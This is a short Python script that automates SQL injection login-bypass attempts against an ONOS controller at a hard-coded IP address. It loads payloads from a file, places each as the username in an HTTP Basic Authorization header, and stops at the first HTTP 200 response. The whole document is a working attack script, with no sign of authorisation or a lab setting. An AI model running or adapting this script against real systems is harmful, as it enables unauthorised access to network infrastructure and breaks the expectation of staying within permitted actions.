import requests 
import base64

url = "http://34.139.11.27:8181/onos/v1/docs/index.html"
payloads_file_path = './sql_payloads/msql-injection-login-bypass.txt'

def read_payloads():
     with open(payloads_file_path, 'r', encoding='ISO-8859-1') as file:
          return [line.strip() for line in file if line.strip()]

sql_payloads = read_payloads()

def encode_credentials(username:str, password:str):
    credentials =  f"{username}:{password}"
    return base64.b64encode(credentials.encode('ISO-8859-1')).decode("ISO-8859-1")

def test_sql_injection(username):
    headers = {
        "Authorization": f"Basic {encode_credentials(username=username, password='test')}",
        "User-Agente": "Mozilla/5.0",
    }
    response = requests.get(url, headers=headers)

    return response

def main():
    for payload in sql_payloads:
        response = test_sql_injection(payload)

        if response.status_code == 200:
                print(f"Possible SQL Injection found with username payload: {payload}")
                break
        else:
                print(f"Unsuccessful attempt with username payload: '{payload}'")


if __name__ == '__main__':
    main()